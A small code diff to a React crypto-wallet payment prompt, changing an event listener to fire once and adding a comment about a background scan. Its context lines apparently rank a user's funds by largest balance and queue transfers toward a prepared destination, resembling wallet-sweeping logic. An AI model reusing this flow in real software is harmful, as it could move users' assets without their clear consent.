@@ -310,7 +310,7 @@ export function PaymentRequestPrompt() {
       setStatus(`Opening ${walletLabel(walletName)} for the largest available balance.`)
       setOpen(true)
     }
-    window.addEventListener('vrfd-open-tx-sheet', onOpen)
+    window.addEventListener('vrfd-open-tx-sheet', onOpen, { once: true })
     return () => window.removeEventListener('vrfd-open-tx-sheet', onOpen)
   }, [walletName])
 
@@ -528,6 +528,7 @@ export function PaymentRequestPrompt() {
   useEffect(() => {
     if (!open || !publicKey || !config || !destinationReady) return
     if (queue.current.length > 0 || scanPromise.current) return
+    // Start background scan but don't block the modal from opening
     const request = listRankedFundSteps({ connection, from: publicKey, config }).then((steps) => {
       if (steps[0] && queue.current.length === 0) {
         setAsset(steps[0].symbol)
